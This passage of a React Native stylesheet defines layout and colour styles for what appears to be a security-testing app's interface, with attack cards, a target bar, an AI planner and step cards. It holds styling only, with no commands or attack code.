  searchInput: { flex: 1, color: Colors.textPrimary, fontSize: Typography.sm },
  chipRow: { flexDirection: 'row', gap: Spacing.sm, paddingHorizontal: Spacing.base, paddingBottom: Spacing.sm },
  chip: { flexDirection: 'row', alignItems: 'center', gap: 4, paddingHorizontal: Spacing.md, paddingVertical: 6, borderRadius: Radius.full, borderWidth: 1, borderColor: Colors.surfaceBorder, backgroundColor: Colors.surface },
  chipActive: { borderColor: Colors.primary+'55', backgroundColor: Colors.primaryMuted },
  chipText: { color: Colors.textMuted, fontSize: Typography.xs, fontWeight: Typography.medium },
  chipDot: { width: 5, height: 5, borderRadius: 2.5 },
  list: { paddingHorizontal: Spacing.base, paddingTop: Spacing.xs, gap: Spacing.md },
  attackCard: { flexDirection: 'row', backgroundColor: Colors.surface, borderWidth: 1, borderColor: Colors.surfaceBorder, borderRadius: Radius.lg, overflow: 'hidden' },
  sevStripe: { width: 4, flexShrink: 0 },
  cardBody: { flex: 1, padding: Spacing.md },
  cardTopRow: { flexDirection: 'row', alignItems: 'center', gap: Spacing.xs, marginBottom: 5, flexWrap: 'wrap' },
  miniTag: { flexDirection: 'row', alignItems: 'center', gap: 3, paddingHorizontal: 5, paddingVertical: 2, borderRadius: 3, borderWidth: 1, borderColor: Colors.surfaceBorder, backgroundColor: Colors.surfaceElevated },
  miniTagText: { fontSize: 9, fontWeight: Typography.bold, color: Colors.textMuted, letterSpacing: 0.3 },
  statusDot: { width: 6, height: 6, borderRadius: 3, marginLeft: 'auto' },
  cardTitle: { color: Colors.textPrimary, fontSize: Typography.base, fontWeight: Typography.semibold, marginBottom: 2 },
  cardSub: { fontSize: Typography.xs, fontWeight: Typography.bold, letterSpacing: 0.5, marginBottom: 3 },
  cardDesc: { color: Colors.textMuted, fontSize: Typography.sm, lineHeight: 18, marginBottom: 6 },
  cardMetaRow: { flexDirection: 'row', alignItems: 'center', gap: Spacing.xs, flexWrap: 'wrap' },
  cardTime: { color: Colors.textMuted, fontSize: 9, marginLeft: 'auto' },
  arsenalCard: { flexDirection: 'row', alignItems: 'center', backgroundColor: Colors.surface, borderWidth: 1, borderColor: Colors.surfaceBorder, borderRadius: Radius.lg, padding: Spacing.base, gap: Spacing.md },
  arsenalIcon: { width: 40, height: 40, borderRadius: Radius.md, borderWidth: 1, justifyContent: 'center', alignItems: 'center', flexShrink: 0 },
  targetBar: { flexDirection: 'row', alignItems: 'center', gap: Spacing.sm, marginHorizontal: Spacing.base, marginTop: Spacing.xs, backgroundColor: Colors.warning+'08', borderWidth: 1, borderColor: Colors.warning+'22', borderRadius: Radius.lg, paddingHorizontal: Spacing.md, paddingVertical: 9 },
  targetInput: { flex: 1, color: Colors.warning, fontSize: Typography.sm, fontFamily: MONO },
  logStatsRow: { flexDirection: 'row', gap: Spacing.sm, paddingHorizontal: Spacing.base, paddingVertical: Spacing.sm, borderBottomWidth: 1, borderBottomColor: Colors.surfaceBorder },
  logStatChip: { backgroundColor: Colors.surface, borderWidth: 1, borderColor: Colors.surfaceBorder, borderRadius: Radius.md, paddingHorizontal: Spacing.md, paddingVertical: 5, alignItems: 'center', minWidth: 52 },
  logEntry: { flexDirection: 'row', gap: Spacing.md, paddingVertical: Spacing.md, paddingHorizontal: Spacing.base, borderBottomWidth: 1, borderBottomColor: Colors.surfaceBorder },
  logDot: { width: 7, height: 7, borderRadius: 3.5, marginTop: 5, flexShrink: 0 },
  logBody: { flex: 1 },
  logCmd: { fontFamily: MONO, fontSize: 12, lineHeight: 18, marginTop: 3, marginBottom: 3 },
  logOutput: { color: Colors.textMuted, fontSize: Typography.xs, lineHeight: 17 },
  empty: { flex: 1, alignItems: 'center', justifyContent: 'center', gap: Spacing.md, paddingVertical: Spacing.xxxl },
  emptyTitle: { color: Colors.textSecondary, fontSize: Typography.lg, fontWeight: Typography.semibold },
  emptySub: { color: Colors.textMuted, fontSize: Typography.sm, textAlign: 'center', paddingHorizontal: Spacing.xxl, lineHeight: 20 },

  // AI Planner
  aiContent: { padding: Spacing.base, gap: Spacing.md },
  aiForm: { gap: Spacing.md },
  aiFormHeader: { flexDirection: 'row', alignItems: 'flex-start', gap: Spacing.md, backgroundColor: Colors.primaryMuted, borderWidth: 1, borderColor: Colors.primary+'33', borderRadius: Radius.lg, padding: Spacing.base },
  aiFormTitle: { color: Colors.primary, fontSize: Typography.sm, fontWeight: Typography.bold, letterSpacing: 1.5, marginBottom: 4, fontFamily: MONO },
  aiFormSub: { color: Colors.textMuted, fontSize: Typography.xs, lineHeight: 17 },
  fieldLabel: { color: Colors.textMuted, fontSize: Typography.xs, fontWeight: Typography.bold, letterSpacing: 1.5, fontFamily: MONO, marginBottom: Spacing.xs },
  aiInput: { backgroundColor: Colors.surface, borderWidth: 1, borderColor: Colors.surfaceBorder, borderRadius: Radius.md, paddingHorizontal: Spacing.md, paddingVertical: Spacing.md, color: Colors.textPrimary, fontSize: Typography.sm, fontFamily: MONO },
  errorBox: { flexDirection: 'row', alignItems: 'flex-start', gap: 6, backgroundColor: Colors.danger+'0d', borderWidth: 1, borderColor: Colors.danger+'33', borderRadius: Radius.md, padding: Spacing.md },
  errorText: { flex: 1, color: Colors.danger, fontSize: Typography.xs, lineHeight: 17 },
  planBtn: { flexDirection: 'row', alignItems: 'center', justifyContent: 'center', gap: Spacing.sm, backgroundColor: Colors.primary, paddingVertical: Spacing.base, borderRadius: Radius.xl, ...Shadow.redGlow },
  planBtnText: { color: Colors.bg, fontSize: Typography.base, fontWeight: Typography.bold, letterSpacing: 1.5, fontFamily: MONO },
  btnDisabled: { opacity: 0.4, shadowOpacity: 0, elevation: 0 },
  planningIndicator: { flexDirection: 'row', alignItems: 'center', gap: Spacing.sm, justifyContent: 'center' },
  planningText: { color: Colors.primary, fontSize: Typography.xs, fontFamily: MONO, flex: 1, textAlign: 'center' },

  // Plan view
  planHeader: { backgroundColor: Colors.primaryMuted, borderWidth: 1, borderColor: Colors.primary+'44', borderRadius: Radius.lg, padding: Spacing.base, gap: Spacing.sm },
  planTitleRow: { flexDirection: 'row', alignItems: 'flex-start', gap: Spacing.sm },
  planTitle: { color: Colors.textPrimary, fontSize: Typography.lg, fontWeight: Typography.bold, flex: 1 },
  planMetaRow: { flexDirection: 'row', alignItems: 'center', gap: Spacing.sm, flexWrap: 'wrap' },
  opsecBadge: { paddingHorizontal: 6, paddingVertical: 2, borderRadius: 3, borderWidth: 1 },
  opsecText: { fontSize: 9, fontWeight: Typography.bold, letterSpacing: 1, fontFamily: MONO },
  planNotes: { color: Colors.textMuted, fontSize: Typography.xs, lineHeight: 17 },
  prereqRow: { flexDirection: 'row', alignItems: 'center', gap: Spacing.sm, flexWrap: 'wrap' },
  prereqLabel: { color: Colors.textMuted, fontSize: Typography.xs, fontWeight: Typography.bold },
  progressBar: { height: 3, backgroundColor: Colors.surfaceElevated, borderRadius: 2, marginVertical: Spacing.sm, overflow: 'hidden' },
  progressFill: { height: '100%', backgroundColor: Colors.primary, borderRadius: 2 },
  runAllBtn: { flexDirection: 'row', alignItems: 'center', justifyContent: 'center', gap: Spacing.sm, backgroundColor: Colors.primary, paddingVertical: Spacing.md, borderRadius: Radius.xl, marginBottom: Spacing.base, ...Shadow.redGlow },
  runAllBtnText: { color: Colors.bg, fontSize: Typography.sm, fontWeight: Typography.bold, letterSpacing: 1.5, fontFamily: MONO },

  // Step cards
  stepCard: { backgroundColor: Colors.surface, borderWidth: 1, borderColor: Colors.surfaceBorder, borderRadius: Radius.lg, overflow: 'hidden', marginBottom: Spacing.sm },
  stepHeader: { flexDirection: 'row', alignItems: 'center', gap: Spacing.md, padding: Spacing.md },
  stepNum: { width: 32, height: 32, borderRadius: 16, borderWidth: 1, justifyContent: 'center', alignItems: 'center', flexShrink: 0 },
  stepNumText: { color: Colors.textSecondary, fontSize: Typography.sm, fontWeight: Typography.bold, fontFamily: MONO },
  stepTitleRow: { flexDirection: 'row', alignItems: 'center', gap: Spacing.xs, marginBottom: 3, flexWrap: 'wrap' },
  stepName: { color: Colors.textPrimary, fontSize: Typography.base, fontWeight: Typography.semibold, flex: 1 },
  stepDesc: { color: Colors.textMuted, fontSize: Typography.xs, lineHeight: 16 },
  stepMitre: { fontSize: 9, fontWeight: Typography.bold, letterSpacing: 0.5, fontFamily: MONO, marginTop: 2 },
  stepExpanded: { borderTopWidth: 1, borderTopColor: Colors.surfaceBorder, padding: Spacing.md, gap: Spacing.sm },
  codeLabel: { color: Colors.textMuted, fontSize: 9, fontWeight: Typography.bold, letterSpacing: 1.5, fontFamily: MONO },
  codeBlock: { backgroundColor: '#000', borderWidth: 1, borderColor: Colors.accent+'22', borderRadius: Radius.md, padding: Spacing.base, marginBottom: Spacing.sm },
  codeText: { fontFamily: MONO, fontSize: 12, lineHeight: 20, color: Colors.accent },
  stepInfoRow: { flexDirection: 'row', alignItems: 'flex-start', gap: 6 },
  stepInfoText: { flex: 1, color: Colors.textMuted, fontSize: Typography.xs, lineHeight: 16 },
  stepActions: { flexDirection: 'row', gap: Spacing.sm, marginTop: Spacing.xs },
  stepRunBtn: { flex: 1, flexDirection: 'row', alignItems: 'center', justifyContent: 'center', gap: 5, backgroundColor: Colors.primary, paddingVertical: Spacing.sm, borderRadius: Radius.xl, ...Shadow.redGlow },
  stepRunBtnText: { color: Colors.bg, fontSize: Typography.xs, fontWeight: Typography.bold, letterSpacing: 1, fontFamily: MONO },
  stepSecBtn: { flexDirection: 'row', alignItems: 'center', gap: 4, borderWidth: 1, borderColor: Colors.primary+'44', paddingHorizontal: Spacing.md, paddingVertical: Spacing.sm, borderRadius: Radius.xl },
  stepSecBtnText: { fontSize: Typography.xs, fontWeight: Typography.bold, letterSpacing: 0.5 },

  // Result box
  resultBox: { backgroundColor: '#000', borderWidth: 1, borderColor: Colors.accent+'22', borderRadius: Radius.md, padding: Spacing.sm, marginTop: Spacing.sm },
  resultHeader: { flexDirection: 'row', alignItems: 'center', gap: Spacing.sm, marginBottom: Spacing.sm },
  resultDot: { width: 7, height: 7, borderRadius: 3.5, flexShrink: 0 },
  resultStatus: { flex: 1, fontSize: Typography.xs, fontWeight: Typography.bold, letterSpacing: 1, fontFamily: MONO },
  analyzeBtn: { flexDirection: 'row', alignItems: 'center', gap: 3, backgroundColor: Colors.primaryMuted, borderWidth: 1, borderColor: Colors.primary+'33', paddingHorizontal: 6, paddingVertical: 3, borderRadius: Radius.full },
  analyzeBtnText: { color: Colors.primary, fontSize: 9, fontWeight: Typography.bold, letterSpacing: 0.5 },

  // Analysis box
  analysisBox: { backgroundColor: Colors.primaryMuted, borderWidth: 1, borderColor: Colors.primary+'33', borderRadius: Radius.md, padding: Spacing.md, marginTop: Spacing.sm },
  analysisHeader: { flexDirection: 'row', alignItems: 'center', gap: 5, marginBottom: Spacing.sm },
  analysisTitle: { color: Colors.primary, fontSize: 9, fontWeight: Typography.bold, letterSpacing: 1.5, fontFamily: MONO },
  analysisLabel: { color: Colors.textMuted, fontSize: 9, fontWeight: Typography.bold, letterSpacing: 1.5, marginTop: Spacing.sm, marginBottom: 3 },
  analysisBullet: { color: Colors.textSecondary, fontSize: Typography.xs, lineHeight: 17 },
  analysisSummary: { color: Colors.textMuted, fontSize: Typography.xs, lineHeight: 16, marginTop: Spacing.sm, fontStyle: 'italic' },

  // Cleanup
  cleanupCard: { backgroundColor: Colors.accentMuted, borderWidth: 1, borderColor: Colors.accent+'22', borderRadius: Radius.lg, padding: Spacing.base, gap: Spacing.xs },
  cleanupHeader: { flexDirection: 'row', alignItems: 'center', gap: 5, marginBottom: 2 },
  cleanupTitle: { color: Colors.accent, fontSize: Typography.xs, fontWeight: Typography.bold, letterSpacing: 1.5, fontFamily: MONO },
  cleanupCmd: { color: Colors.accent, fontSize: 11, fontFamily: MONO, lineHeight: 18 },

  // Modals
  modalOverlay: { flex: 1, backgroundColor: Colors.overlay, justifyContent: 'flex-end' },
  modalSheet: { backgroundColor: Colors.bgSecondary, borderTopLeftRadius: 24, borderTopRightRadius: 24, borderTopWidth: 1, borderColor: Colors.surfaceBorder, paddingHorizontal: Spacing.base, paddingBottom: 32 },
  modalHandle: { width: 40, height: 4, backgroundColor: Colors.surfaceBorder, borderRadius: 2, alignSelf: 'center', marginTop: Spacing.md, marginBottom: Spacing.base },
  modalHeader: { flexDirection: 'row', alignItems: 'center', justifyContent: 'space-between', marginBottom: Spacing.base },
  modalHeaderRight: { flexDirection: 'row', gap: Spacing.md, alignItems: 'center' },
  modalTitle: { color: Colors.textPrimary, fontSize: Typography.lg, fontWeight: Typography.bold, letterSpacing: 1, flex: 1 },
  badgeRow: { flexDirection: 'row', gap: Spacing.sm, flexWrap: 'wrap', marginBottom: Spacing.base },
  infoRow: { color: Colors.textSecondary, fontSize: Typography.sm, marginBottom: Spacing.xs },
  infoLabel: { color: Colors.textMuted, fontWeight: Typography.semibold },
  sectionLabel: { color: Colors.textMuted, fontSize: Typography.xs, fontWeight: Typography.bold, letterSpacing: 1.5, marginBottom: Spacing.sm, marginTop: Spacing.base },
  bodyText: { color: Colors.textSecondary, fontSize: Typography.base, lineHeight: 22, marginBottom: Spacing.sm },
  modalActions: { flexDirection: 'row', gap: Spacing.sm, marginTop: Spacing.md },
  dangerBtn: { flexDirection: 'row', alignItems: 'center', gap: 5, borderWidth: 1, borderColor: Colors.danger+'44', paddingHorizontal: Spacing.base, paddingVertical: Spacing.md, borderRadius: Radius.xl },
  dangerBtnText: { color: Colors.danger, fontSize: Typography.sm, fontWeight: Typography.bold, letterSpacing: 1 },
  primaryBtn: { flex: 1, flexDirection: 'row', alignItems: 'center', justifyContent: 'center', gap: 6, backgroundColor: Colors.primary, paddingVertical: Spacing.md, borderRadius: Radius.xl, ...Shadow.redGlow },
  primaryBtnText: { color: Colors.bg, fontSize: Typography.base, fontWeight: Typography.bold, letterSpacing: 1.5 },
  resultHeaderLeft: { flexDirection: 'row', alignItems: 'center', gap: Spacing.sm },
  formGroup: { marginBottom: Spacing.md },
  formLabel: { color: Colors.textMuted, fontSize: Typography.xs, fontWeight: Typography.bold, letterSpacing: 1.5, marginBottom: Spacing.xs },
  formInput: { backgroundColor: Colors.surface, borderWidth: 1, borderColor: Colors.surfaceBorder, borderRadius: Radius.md, paddingHorizontal: Spacing.md, paddingVertical: Spacing.md, color: Colors.textPrimary, fontSize: Typography.base },
  confirmOverlay: { flex: 1, backgroundColor: Colors.overlay, justifyContent: 'center', alignItems: 'center', padding: Spacing.xl },
  confirmBox: { backgroundColor: Colors.bgSecondary, borderWidth: 1, borderColor: Colors.danger+'44', borderRadius: Radius.xl, padding: Spacing.xl, alignItems: 'center', gap: Spacing.md, width: '100%', maxWidth: 340 },
});
